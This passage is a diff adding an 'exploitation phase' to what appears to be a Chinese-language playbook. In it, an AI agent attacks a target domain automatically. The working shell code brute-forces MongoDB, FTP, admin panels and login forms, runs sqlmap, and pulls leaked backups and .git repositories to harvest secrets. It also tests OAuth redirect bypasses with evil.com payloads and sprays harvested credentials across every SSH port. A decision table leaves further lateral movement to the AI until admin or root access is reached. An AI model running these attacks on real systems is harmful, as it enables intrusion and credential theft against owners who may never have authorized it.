+          echo "✅ MongoDB SUCCESS: $USER@$HOST:$PORT"
+          echo "$RESULT" > "targets/$DOMAIN"/exploit_result/evidence/${ATTEMPT_ID}_output.txt
+          echo "mongodb-access|$HOST:$PORT|$USER:$PASS|$(echo "$RESULT" | head -1)" | \
+            anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+          echo "mongodb|$HOST:$PORT|$USER:$PASS" | \
+            anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+        else
+          echo "⚠️ MongoDB FAILED: $USER@$HOST:$PORT"
+        fi
+        ;;
+
+      ftp)
+        RESULT=$(curl -s --max-time 10 "ftp://$USER:$PASS@$HOST:$PORT/" 2>/dev/null)
+        if [ -n "$RESULT" ] && ! echo "$RESULT" | grep -qi 'failed\|denied\|530\|invalid'; then
+          echo "✅ FTP SUCCESS: $USER@$HOST:$PORT"
+          echo "$RESULT" > "targets/$DOMAIN"/exploit_result/evidence/${ATTEMPT_ID}_output.txt
+          echo "ftp-access|$HOST:$PORT|$USER:$PASS|directory listing" | \
+            anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+          echo "ftp|$HOST:$PORT|$USER:$PASS" | \
+            anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+        else
+          echo "⚠️ FTP FAILED: $USER@$HOST:$PORT"
+        fi
+        ;;
+
+      mssql|oracle|rdp|smb|telnet)
+        echo "⏭️ $SERVICE: 暂不支持自动利用，记录凭据"
+        echo "$SERVICE|$HOST:$PORT|$USER:$PASS" | \
+          anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+        ;;
+    esac
+  done < "targets/$DOMAIN"/brute_result/brute_success.txt
+fi
+```
+
+### 8.3 SQL 注入利用
+
+**触发**: Phase 7 研判标记 SQLi 的 findings（nuclei / afrog / DAST 检出）。
+
+```bash
+set -o pipefail
+
+# 检查 sqlmap 可用性
+if ! command -v sqlmap >/dev/null 2>&1 && [ ! -f /opt/sqlmap/sqlmap.py ]; then
+  echo "⚠️ sqlmap 不可用，SQLi 利用降级为手动验证"
+fi
+
+# AI 从 Phase 7 研判结果中提取 SQLi 候选 URL
+# 每条 SQLi URL: 先 sqlmap --dbs → 确认可注入 → 必要时 --dump
+
+# 执行模板（AI 根据具体 URL 填入参数）:
+SQLMAP="/opt/sqlmap/sqlmap.py"
+SQLI_URL="<从 Phase 7 研判提取>"
+
+echo "🔍 sqlmap: $SQLI_URL"
+run_with_watchdog "sqlmap" 1800 300 \
+  "targets/$DOMAIN/exploit_result/sqlmap_output.txt" \
+  "targets/$DOMAIN/exploit_result/sqlmap_err.log" -- \
+  python3 "$SQLMAP" -u "$SQLI_URL" --batch --random-agent \
+    --level=2 --risk=2 --threads=5 --dbs \
+    --output-dir="targets/$DOMAIN/exploit_result/sqlmap"
+
+# 从 sqlmap 输出提取凭据
+find "targets/$DOMAIN"/exploit_result/sqlmap -name "*.csv" -exec \
+  grep -iE 'pass|user|admin|token|secret|key|cred|auth' {} \; 2>/dev/null | \
+  anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+```
+
+### 8.4 备份/配置泄露利用
+
+**触发**: `backup_result/backup_scan.txt` 非空 或 Phase 7 研判标记 backup / .git / .env leaks。
+
+```bash
+set -o pipefail
+
+if [ ! -s "targets/$DOMAIN"/backup_result/backup_scan.txt ]; then
+  echo "⏭️ 备份泄露利用: backup_scan.txt 为空，跳过"
+else
+  echo "📥 下载泄露文件..."
+
+  while IFS= read -r line; do
+    # 从 backup_scan.txt 提取 URL
+    LEAK_URL=$(echo "$line" | grep -oE 'https?://[^ ]+' | head -1)
+    [ -z "$LEAK_URL" ] && continue
+
+    SAFE_NAME=$(echo "$LEAK_URL" | tr '/:?=&' '_' | head -c 80)
+    TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+
+    echo "▶ 下载: $LEAK_URL"
+    curl -s -k -L --max-time 120 \
+      -o "targets/$DOMAIN"/exploit_result/evidence/download_${SAFE_NAME} \
+      "$LEAK_URL" 2>/dev/null
+
+    DOWNLOAD_FILE="targets/$DOMAIN/exploit_result/evidence/download_${SAFE_NAME}"
+
+    if [ -f "$DOWNLOAD_FILE" ] && [ "$(stat -c%s "$DOWNLOAD_FILE" 2>/dev/null || echo 0)" -gt 0 ]; then
+      # 计算 SHA256
+      sha256sum "$DOWNLOAD_FILE" | cut -d' ' -f1 > "${DOWNLOAD_FILE}.sha256"
+
+      # 如果是 zip → 解压
+      if echo "$LEAK_URL" | grep -qE '\.zip$'; then
+        unzip -o "$DOWNLOAD_FILE" -d "${DOWNLOAD_FILE}_extracted" 2>/dev/null
+      elif echo "$LEAK_URL" | grep -qE '\.tar\.gz$|\.tgz$'; then
+        mkdir -p "${DOWNLOAD_FILE}_extracted"
+        tar -xzf "$DOWNLOAD_FILE" -C "${DOWNLOAD_FILE}_extracted" 2>/dev/null
+      fi
+
+      # 搜索凭据
+      find "${DOWNLOAD_FILE}"* -type f 2>/dev/null | while read -r ef; do
+        [ -f "$ef" ] || continue
+        grep -iHE 'DB_PASSWORD|DB_USER|password|secret|api_key|token|DSN|mysql://|postgresql://|mongodb://|redis://|JWT_SECRET|APP_KEY' "$ef" 2>/dev/null
+      done | anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+
+      echo "✅ 下载完成: $LEAK_URL ($(stat -c%s "$DOWNLOAD_FILE" 2>/dev/null || echo 0) bytes)"
+    fi
+  done < "targets/$DOMAIN"/backup_result/backup_scan.txt
+fi
+```
+
+### 8.5 .git 源码泄露利用
+
+```bash
+# AI 从 Phase 7 研判中提取 .git 泄露 URL
+GIT_URL="<从 Phase 7 研判提取>"
+
+if [ -n "$GIT_URL" ]; then
+  echo "🔍 git-dumper: $GIT_URL"
+  GIT_DUMP_DIR="targets/$DOMAIN/exploit_result/evidence/git_dump"
+
+  if command -v git-dumper >/dev/null 2>&1; then
+    git-dumper "$GIT_URL" "$GIT_DUMP_DIR" 2>/dev/null
+  else
+    # fallback: wget 递归下载
+    wget -r -np -nH --cut-dirs=1 -P "$GIT_DUMP_DIR" \
+      --timeout=30 -t 1 "$GIT_URL" 2>/dev/null
+  fi
+
+  # 搜索 git 历史中的凭据
+  if [ -d "$GIT_DUMP_DIR/.git" ]; then
+    cd "$GIT_DUMP_DIR"
+    git log -p 2>/dev/null | grep -iE 'password|secret|key|token|DSN|conn' | head -50 | \
+      anew "../../harvested_credentials.txt"
+    cd - >/dev/null
+  fi
+
+  # 搜索文件内容中的凭据
+  find "$GIT_DUMP_DIR" -type f -name "*.env" -o -name "*config*" -o -name "*.php" 2>/dev/null | \
+    xargs grep -iHE 'password|secret|key|token' 2>/dev/null | head -30 | \
+    anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+fi
+```
+
+### 8.6 默认凭据尝试
+
+```bash
+set -o pipefail
+
+if [ ! -s "targets/$DOMAIN"/active_webs/high_value_targets.txt ]; then
+  echo "⏭️ 默认凭据尝试: high_value_targets.txt 为空，跳过"
+else
+  echo "🔑 尝试常见默认凭据..."
+
+  # 默认凭据小字典（≤20 对，非破坏性）
+  DEFAULT_CREDS="admin:admin admin:password admin:123456 root:root root:admin guest:guest admin:admin123 tomcat:tomcat weblogic:welcome1 jenkins:jenkins"
+
+  while IFS= read -r target_line; do
+    TARGET_URL=$(echo "$target_line" | awk '{print $1}')
+
+    for cred in $DEFAULT_CREDS; do
+      USER=$(echo "$cred" | cut -d: -f1)
+      PASS=$(echo "$cred" | cut -d: -f2)
+
+      # Basic Auth 尝试
+      HTTP_CODE=$(curl -s -k -u "$USER:$PASS" "$TARGET_URL" -o /dev/null -w '%{http_code}' --max-time 10 2>/dev/null)
+
+      if [ "$HTTP_CODE" != "401" ] && [ "$HTTP_CODE" != "403" ]; then
+        echo "✅ $TARGET_URL — $USER:$PASS → HTTP $HTTP_CODE"
+        echo "panel-login|$TARGET_URL|$USER:$PASS|HTTP $HTTP_CODE" | \
+          anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+        echo "http-panel|$TARGET_URL|$USER:$PASS" | \
+          anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+        break  # 找到一个有效的就停止尝试其他凭据
+      fi
+      # 速率限制
+      sleep 1
+    done
+  done < "targets/$DOMAIN"/active_webs/high_value_targets.txt
+fi
+```
+
+### 8.7 登录口弱口令爆破
+
+**触发**: Phase 5 `high_value_targets.txt` 中有管理后台路径，或 dirsearch 发现 401/403 管理入口。
+
+```bash
+set -o pipefail
+
+# 构建登录口候选清单
+: > "targets/$DOMAIN"/exploit_result/login_candidates.txt
+
+# 从 high_value_targets 提取
+if [ -s "targets/$DOMAIN"/active_webs/high_value_targets.txt ]; then
+  grep -iE 'admin|login|signin|manager|dashboard|console' \
+    "targets/$DOMAIN"/active_webs/high_value_targets.txt 2>/dev/null | \
+    anew "targets/$DOMAIN"/exploit_result/login_candidates.txt
+fi
+
+# 从 dirsearch 提取 401/403 管理入口
+find "targets/$DOMAIN"/dirsearch_result -name 'smart_scan_*.txt' -exec \
+  grep -E '40[13]\s' {} \; 2>/dev/null | \
+  grep -iE 'admin|manager|login|console|api' | \
+  anew "targets/$DOMAIN"/exploit_result/login_candidates.txt
+
+LOGIN_COUNT=$(wc -l < "targets/$DOMAIN"/exploit_result/login_candidates.txt 2>/dev/null || echo 0)
+
+if [ "$LOGIN_COUNT" -eq 0 ]; then
+  echo "⏭️ 登录口爆破: 无候选登录口，跳过"
+else
+  echo "🔑 登录口爆破: $LOGIN_COUNT 个候选"
+
+  # 弱口令小字典
+  cat > "targets/$DOMAIN"/exploit_result/small_passwords.txt <<'DICT'
+admin
+admin123
+admin888
+password
+123456
+admin@123
+root
+test
+guest
+tomcat
+weblogic
+welcome1
+P@ssw0rd
+password123
+admin123456
+DICT
+
+  while IFS= read -r candidate; do
+    # 提取 URL
+    LOGIN_URL=$(echo "$candidate" | grep -oE 'https?://[^ ]+' | head -1)
+    [ -z "$LOGIN_URL" ] && continue
+
+    echo "▶ 尝试: $LOGIN_URL"
+
+    # 先探测登录类型
+    HTTP_HEADER=$(curl -s -k --max-time 10 -I "$LOGIN_URL" 2>/dev/null | head -20)
+
+    if echo "$HTTP_HEADER" | grep -q 'WWW-Authenticate: Basic'; then
+      # ── Basic Auth ──
+      echo "  🔍 Basic Auth 模式"
+      while IFS= read -r pass; do
+        HTTP_CODE=$(curl -s -k -u "admin:$pass" "$LOGIN_URL" \
+          -o /dev/null -w '%{http_code}' --max-time 5 2>/dev/null)
+        if [ "$HTTP_CODE" != "401" ] && [ "$HTTP_CODE" != "403" ]; then
+          echo "  ✅ admin:$pass → HTTP $HTTP_CODE"
+          echo "panel-basic-auth|$LOGIN_URL|admin:$pass|HTTP $HTTP_CODE" | \
+            anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+          echo "http-basic-auth|$LOGIN_URL|admin:$pass" | \
+            anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+          break
+        fi
+        sleep 1
+      done < "targets/$DOMAIN"/exploit_result/small_passwords.txt
+
+    else
+      # ── 表单/JSON 登录 ──
+      echo "  🔍 表单/API 模式 — AI 需手动识别表单字段后运行 ffuf"
+
+      # AI 先 curl 获取页面，识别 <form> 或 API 格式
+      FORM_HTML=$(curl -s -k -L --max-time 10 "$LOGIN_URL" 2>/dev/null)
+      echo "$FORM_HTML" | grep -iE '<form|<input' | head -20
+
+      # AI 根据表单结构选择 ffuf 命令:
+      # 提示模板（AI 填入具体参数后执行）:
+      echo "  ⚙️ ffuf 爆破命令模板:"
+      echo "  ffuf -u '$LOGIN_URL' \\"
+      echo "    -w targets/$DOMAIN/exploit_result/small_passwords.txt:PASS \\"
+      echo "    -d 'username=admin&password=PASS' \\"
+      echo "    -fc 401,403 -t 1 -p 1 -maxtime 600"
+    fi
+  done < "targets/$DOMAIN"/exploit_result/login_candidates.txt
+fi
+
+# 清理临时字典
+rm -f "targets/$DOMAIN"/exploit_result/small_passwords.txt
+```
+
+### 8.8 注册接口利用
+
+**触发**: Phase 5/7 发现注册页面 (/register, /signup)，或 dirsearch 命中 200 的注册路径。
+
+```bash
+set -o pipefail
+
+# 构建注册口候选清单
+: > "targets/$DOMAIN"/exploit_result/register_candidates.txt
+
+# 从 httpx JSON 指纹提取
+if [ -s "targets/$DOMAIN"/active_webs/active_websfinger.json ]; then
+  cat "targets/$DOMAIN"/active_webs/active_websfinger.json | \
+    jq -r 'select(.url != null and (.url | test("register|signup|join|create"; "i"))) | .url' 2>/dev/null | \
+    anew "targets/$DOMAIN"/exploit_result/register_candidates.txt
+fi
+
+# 从 dirsearch 补充
+find "targets/$DOMAIN"/dirsearch_result -name 'smart_scan_*.txt' -exec \
+  grep -iE 'register|signup|join' {} \; 2>/dev/null | \
+  grep -oE 'https?://[^ ]+' | \
+  anew "targets/$DOMAIN"/exploit_result/register_candidates.txt
+
+REG_COUNT=$(wc -l < "targets/$DOMAIN"/exploit_result/register_candidates.txt 2>/dev/null || echo 0)
+
+if [ "$REG_COUNT" -eq 0 ]; then
+  echo "⏭️ 注册接口利用: 无候选，跳过"
+else
+  echo "📝 注册接口利用: $REG_COUNT 个候选"
+
+  while IFS= read -r reg_url; do
+    [ -z "$reg_url" ] && continue
+    echo "▶ 尝试注册: $reg_url"
+
+    # 生成随机测试账号
+    TEST_USER="test_$(date +%s)"
+    TEST_PASS="Test@123456"
+    COOKIE_FILE="targets/$DOMAIN/exploit_result/evidence/register_${TEST_USER}_cookies.txt"
+
+    # Step 1: 尝试注册
+    REG_RESULT=$(curl -s -k -X POST "$reg_url" \
+      -d "username=$TEST_USER&password=$TEST_PASS&confirm_password=$TEST_PASS&email=${TEST_USER}@test.local" \
+      -H 'Content-Type: application/x-www-form-urlencoded' \
+      -c "$COOKIE_FILE" \
+      -w '\nHTTP_CODE: %{http_code}\n' --max-time 15 2>/dev/null)
+
+    if echo "$REG_RESULT" | grep -qE '302|HTTP_CODE: 30[0-9]|success|注册成功|创建成功'; then
+      echo "  ✅ 注册成功: $TEST_USER"
+
+      # Step 2: 尝试用注册账号登录
+      LOGIN_URL=$(echo "$reg_url" | sed 's/register/login/;s/signup/signin/;s/join/login/')
+      LOGIN_RESULT=$(curl -s -k -X POST "$LOGIN_URL" \
+        -d "username=$TEST_USER&password=$TEST_PASS" \
+        -c "$COOKIE_FILE" \
+        -w '\nHTTP_CODE: %{http_code}\n' --max-time 15 2>/dev/null)
+
+      if echo "$LOGIN_RESULT" | grep -qE '302|HTTP_CODE: 30[0-9]' || \
+         (echo "$LOGIN_RESULT" | grep -q '200' && ! echo "$LOGIN_RESULT" | grep -qi '错误\|failed\|invalid'); then
+        echo "  ✅ 登录成功: $TEST_USER / $TEST_PASS"
+        echo "register-login|$reg_url|$TEST_USER:$TEST_PASS|login OK" | \
+          anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+        echo "web-account|${reg_url%/*}|$TEST_USER:$TEST_PASS" | \
+          anew "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+
+        # Step 3: 越权测试 — 用注册用户访问管理功能
+        echo "  🔍 越权测试中..."
+        for admin_path in "/admin" "/admin/dashboard" "/admin/users" "/manager" \
+          "/api/v1/users" "/api/admin" "/system" "/wp-admin" "/user/admin"; do
+          ADMIN_URL="${reg_url%/*}${admin_path}"
+          HTTP_CODE=$(curl -s -k -b "$COOKIE_FILE" "$ADMIN_URL" \
+            -o /dev/null -w '%{http_code}' --max-time 10 2>/dev/null)
+          if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
+            echo "  🔓 $admin_path → HTTP $HTTP_CODE (注册用户可访问!)"
+            echo "privilege-escalation|$ADMIN_URL|$TEST_USER|HTTP $HTTP_CODE" | \
+              anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+          fi
+        done
+      else
+        echo "  ⚠️ 注册成功但登录失败，需手动确认"
+      fi
+    else
+      echo "  ⚠️ 注册失败或需验证码/邮箱验证"
+
+      # 尝试更简洁的注册 payload
+      REG_RESULT2=$(curl -s -k -X POST "$reg_url" \
+        -d "user=$TEST_USER&pass=$TEST_PASS" \
+        -w '\nHTTP_CODE: %{http_code}\n' --max-time 10 2>/dev/null)
+      if echo "$REG_RESULT2" | grep -qE '302|30[0-9]|success'; then
+        echo "  ✅ 简洁 payload 注册成功: $TEST_USER"
+      fi
+    fi
+
+    # 记录测试账号（供后续手动清理）
+    echo "test_account|$TEST_USER|$TEST_PASS|$reg_url" | \
+      anew "targets/$DOMAIN"/exploit_result/test_accounts.txt
+    sleep 2
+  done < "targets/$DOMAIN"/exploit_result/register_candidates.txt
+fi
+```
+
+### 8.9 OAuth / OpenID 流程滥用
+
+**触发**: Phase 5/7 发现 OAuth 端点，或 nuclei 检出 OAuth 模板。
+
+```bash
+set -o pipefail
+
+# 探测 OpenID Connect 元数据
+echo "🔍 探测 OAuth 端点..."
+: > "targets/$DOMAIN"/exploit_result/evidence/oauth_metadata.txt
+
+if [ -s "targets/$DOMAIN"/active_webs/active_webs.txt ]; then
+  while IFS= read -r base_url; do
+    [ -z "$base_url" ] && continue
+    echo "  ▶ $base_url/.well-known/openid-configuration"
+    curl -s --max-time 10 "$base_url/.well-known/openid-configuration" 2>/dev/null | \
+      tee -a "targets/$DOMAIN"/exploit_result/evidence/oauth_metadata.txt
+    echo ""
+  done < "targets/$DOMAIN"/active_webs/active_webs.txt
+fi
+
+# 解析 OAuth 配置
+if [ -s "targets/$DOMAIN"/exploit_result/evidence/oauth_metadata.txt" ] && \
+   grep -q 'authorization_endpoint' "targets/$DOMAIN"/exploit_result/evidence/oauth_metadata.txt 2>/dev/null; then
+
+  echo "✅ 发现 OAuth/OpenID 端点"
+
+  # 提取关键端点 (AI 从 metadata 解析)
+  AUTH_ENDPOINT=$(grep 'authorization_endpoint' "targets/$DOMAIN"/exploit_result/evidence/oauth_metadata.txt | \
+    sed 's/.*"authorization_endpoint":"//;s/".*//' | head -1)
+  TOKEN_ENDPOINT=$(grep 'token_endpoint' "targets/$DOMAIN"/exploit_result/evidence/oauth_metadata.txt | \
+    sed 's/.*"token_endpoint":"//;s/".*//' | head -1)
+
+  echo "  Auth: $AUTH_ENDPOINT"
+  echo "  Token: $TOKEN_ENDPOINT"
+
+  # ── redirect_uri 绕过测试 ──
+  echo ""
+  echo "🧪 redirect_uri 绕过测试..."
+
+  # 尝试获取 client_id (从 JS/HTML 中搜索)
+  for base in $(head -5 "targets/$DOMAIN"/active_webs/active_webs.txt 2>/dev/null); do
+    CLIENT_ID=$(curl -s --max-time 10 "$base" 2>/dev/null | \
+      grep -oE 'client_id["\s:=]+["'\'']?([a-zA-Z0-9_-]+)' | head -1 | grep -oE '[a-zA-Z0-9_-]+$')
+    [ -n "$CLIENT_ID" ] && break
+  done
+
+  if [ -z "$CLIENT_ID" ]; then
+    echo "⚠️ 未找到 client_id，OAuth 绕过测试需要 AI 手动提取"
+  else
+    echo "  Client ID: $CLIENT_ID"
+    LEGIT_REDIRECT="https://${DOMAIN}/callback"
+
+    # 测试 payload 清单
+    for bypass_uri in \
+      "${LEGIT_REDIRECT}@evil.com" \
+      "${LEGIT_REDIRECT}.evil.com" \
+      "${LEGIT_REDIRECT}%40evil.com" \
+      "${LEGIT_REDIRECT}%23evil.com" \
+      "https://evil.com/${DOMAIN}/callback" \
+      "https://evil.com?${DOMAIN}" \
+      "evil.com"; do
+
+      ENCODED_REDIRECT=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$bypass_uri'''))")
+      HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 \
+        "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$ENCODED_REDIRECT" 2>/dev/null)
+
+      if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ] || [ "$HTTP_CODE" = "303" ]; then
+        echo "  🔓 redirect_uri 绕过: $bypass_uri → HTTP $HTTP_CODE"
+        echo "oauth-redirect-bypass|$AUTH_ENDPOINT|$bypass_uri|HTTP $HTTP_CODE" | \
+          anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+      fi
+    done
+
+    # ── state 参数检测 ──
+    echo ""
+    echo "🧪 state 参数检测..."
+    STATE_RESPONSE=$(curl -s -v "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT" 2>&1)
+    if echo "$STATE_RESPONSE" | grep -qi 'location'; then
+      LOCATION=$(echo "$STATE_RESPONSE" | grep -i 'location:' | head -1)
+      if ! echo "$LOCATION" | grep -q 'state='; then
+        echo "  🔓 state 参数缺失 — CSRF 攻击可绑定受害者账号"
+        echo "oauth-no-state|$AUTH_ENDPOINT|CSRF possible" | \
+          anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+      fi
+    fi
+
+    # ── PKCE 检测 ──
+    echo ""
+    echo "🧪 PKCE 强制检测..."
+    PKCE_RESPONSE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 \
+      "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT" 2>/dev/null)
+    if [ "$PKCE_RESPONSE" = "302" ] || [ "$PKCE_RESPONSE" = "303" ]; then
+      echo "  🔓 PKCE 非强制 — 授权码可被拦截后兑换"
+      echo "oauth-no-pkce|$AUTH_ENDPOINT|code_challenge not required" | \
+        anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+    fi
+
+    # ── Scope 越权测试 ──
+    echo ""
+    echo "🧪 Scope 越权测试..."
+    for scope in admin write delete internal_api 'user.read.all' 'offline_access'; do
+      SCOPE_CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 \
+        "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT&scope=$scope" 2>/dev/null)
+      if [ "$SCOPE_CODE" = "302" ] || [ "$SCOPE_CODE" = "303" ]; then
+        echo "  🔓 scope '$scope' 被接受"
+        echo "oauth-scope-escalation|$AUTH_ENDPOINT|$scope|accepted" | \
+          anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+      fi
+    done
+  fi
+
+  # ── Token 端点 public client 测试 ──
+  echo ""
+  echo "🧪 Token 端点 public client 测试..."
+  if [ -n "$TOKEN_ENDPOINT" ]; then
+    TOKEN_RESPONSE=$(curl -s -X POST "$TOKEN_ENDPOINT" \
+      -d "grant_type=authorization_code&code=test&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT" \
+      -w '\nHTTP_CODE: %{http_code}\n' --max-time 10 2>/dev/null)
+    if echo "$TOKEN_RESPONSE" | grep -q 'HTTP_CODE: 40[0-9]'; then
+      echo "  ✅ Token 端点正确拒绝无 secret 请求"
+    elif echo "$TOKEN_RESPONSE" | grep -q 'HTTP_CODE: 200'; then
+      echo "  🔓 Token 端点接受无 client_secret 请求 (public client)"
+      echo "oauth-public-client|$TOKEN_ENDPOINT|no secret required" | \
+        anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+    fi
+  fi
+
+  # 汇总
+  echo ""
+  echo "──────────── OAuth 利用汇总 ────────────"
+  echo "授权端点: $AUTH_ENDPOINT"
+  echo "Token 端点: $TOKEN_ENDPOINT"
+  echo "Client ID: $CLIENT_ID"
+  echo ""
+  grep 'oauth-' "targets/$DOMAIN"/exploit_result/exploit_success.txt 2>/dev/null | while read -r finding; do
+    echo "  🔓 $finding"
+  done
+else
+  echo "⏭️ OAuth 利用: 未发现 OAuth/OpenID 端点，跳过"
+fi
+```
+
+### 8.10 凭据复用喷洒
+
+**触发**: `exploit_result/harvested_credentials.txt` 在 Phase 8 执行过程中有新条目。
+
+```bash
+set -o pipefail
+
+if [ -s "targets/$DOMAIN"/exploit_result/harvested_credentials.txt ]; then
+  echo "🔄 凭据复用喷洒..."
+  echo "   $(wc -l < targets/$DOMAIN/exploit_result/harvested_credentials.txt) 对凭据 × $(wc -l < targets/$DOMAIN/active_ports/active_ports.txt) 个目标"
+
+  # 构建只含 SSH 端口的目标清单
+  grep ':22$' "targets/$DOMAIN"/active_ports/active_ports.txt 2>/dev/null | \
+    anew "targets/$DOMAIN"/exploit_result/ssh_targets.txt
+
+  if [ -s "targets/$DOMAIN"/exploit_result/ssh_targets.txt ]; then
+    while IFS= read -r cred_line; do
+      # 格式: <type>|<host:port>|<user:pass>
+      USER=$(echo "$cred_line" | cut -d'|' -f3 | cut -d: -f1)
+      PASS=$(echo "$cred_line" | cut -d'|' -f3 | cut -d: -f2)
+      [ -z "$USER" ] || [ -z "$PASS" ] && continue
+
+      while IFS= read -r target_line; do
+        HOST=$(echo "$target_line" | cut -d: -f1)
+        PORT=$(echo "$target_line" | cut -d: -f2)
+
+        echo "  🔄 Trying $USER:$PASS @ $HOST:$PORT"
+        if sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no \
+          -o ConnectTimeout=5 -o BatchMode=yes \
+          "$USER@$HOST" -p "$PORT" 'id' 2>/dev/null | grep -q 'uid='; then
+          echo "  🎯 CREDENTIAL REUSE SUCCESS: $USER:$PASS @ $HOST:$PORT"
+          echo "ssh-reuse|$HOST:$PORT|$USER:$PASS|credential reuse" | \
+            anew "targets/$DOMAIN"/exploit_result/exploit_success.txt
+        fi
+      done < "targets/$DOMAIN"/exploit_result/ssh_targets.txt
+    done < "targets/$DOMAIN"/exploit_result/harvested_credentials.txt
+  fi
+fi
+```
+
+### 8.11 利用报告
+
+```bash
+echo ""
+echo "╔══════════════════════════════════════════════════════════════╗"
+echo "║         Exploit Report — $DOMAIN                              ║"
+echo "╚══════════════════════════════════════════════════════════════╝"
+echo "利用时间: $(date)"
+echo ""
+echo "──────────── 利用统计 ────────────"
+printf "  %-30s %s 条\n" "成功获取访问权" "$(wc -l < targets/$DOMAIN/exploit_result/exploit_success.txt 2>/dev/null || echo 0)"
+printf "  %-30s %s 条\n" "收割凭据" "$(wc -l < targets/$DOMAIN/exploit_result/harvested_credentials.txt 2>/dev/null || echo 0)"
+printf "  %-30s %s 条\n" "利用日志" "$(wc -l < targets/$DOMAIN/exploit_result/exploit_log.txt 2>/dev/null || echo 0)"
+echo ""
+echo "──────────── 获取的访问权 ────────────"
+cat "targets/$DOMAIN"/exploit_result/exploit_success.txt 2>/dev/null || echo "  (无)"
+echo ""
+echo "──────────── 收割的凭据 ────────────"
+cat "targets/$DOMAIN"/exploit_result/harvested_credentials.txt 2>/dev/null || echo "  (无)"
+echo ""
+echo "──────────── 证据文件 ────────────"
+find "targets/$DOMAIN"/exploit_result/evidence -type f -exec ls -lh {} \; 2>/dev/null | \
+  awk '{printf "  %-60s %s\n", $NF, $5}'
+```
+
+**Phase 8 产物清单**:
+```
+targets/$DOMAIN/exploit_result/
+├── exploit_log.txt              ← 所有尝试日志 (anew)
+├── exploit_success.txt          ← 成功利用记录 (anew)
+├── harvested_credentials.txt    ← 收割的凭据 (anew)
+├── sqlmap_output.txt            ← sqlmap 输出（如有）
+├── evidence/
+│   ├── ssh_<host>_<user>_output.txt    ← SSH 登录收集的系统信息
+│   ├── download_<name>                 ← 下载的泄露文件
+│   ├── git_dump/                       ← git-dumper 提取的源码
+│   └── ...
+└── sqlmap/                      ← sqlmap 详细输出目录（如有）
+```
+
+**MUST 输出 checkpoint**:
+- [ ] 候选利用目标数（按 tier 分布）
+- [ ] 成功获取访问权 N 个
+- [ ] 收割凭据 N 对
+- [ ] 凭据复用成功 N 次
+- [ ] 证据文件清单
+
 ---
 
 ## 多域名汇总（按需触发）
@@ -1380,3 +2338,10 @@ HTML 报告包含：
 | 排列增量截断 | dnsgen/alterx 本次新增 > 1000 条 | 清空该工具结果（去噪） |
 | CDN 过滤 | IP 含 CDN/云标签 | 自动剔除 |
 | 内网分离 | IP 含局域网标签 | 分离到 intranet 文件 |
+| 利用启动 | Phase 7 研判存在有效漏洞 | 启动 Phase 8 / 跳过并输出原因 |
+| 利用优先级 | brute_success > RCE > SQLi > 泄露 > 凭据 > 上传 > LFI > SSTI > SSRF | 按 tier 顺序逐条执行 |
+| 凭据收割 | 利用过程中发现新凭据 | 写入 harvested_credentials.txt 并触发 8.7 喷洒 |
+| 凭据复用 | harvested_credentials.txt 非空 | 所有凭据对所有 SSH 端口尝试 |
+| 攻击链 | 获得新访问权后存在未尝试目标 | AI 判断是否继续横向移动 |
+| 利用停止 | root/admin 级别已获得 / 所有 playbook 耗尽 / 连续 3 次无进展 | 停止利用，生成报告 |
+| 破坏性操作 | 任何写/删/改操作 | 禁止执行；可逆证明可（Redis SET→DEL） |
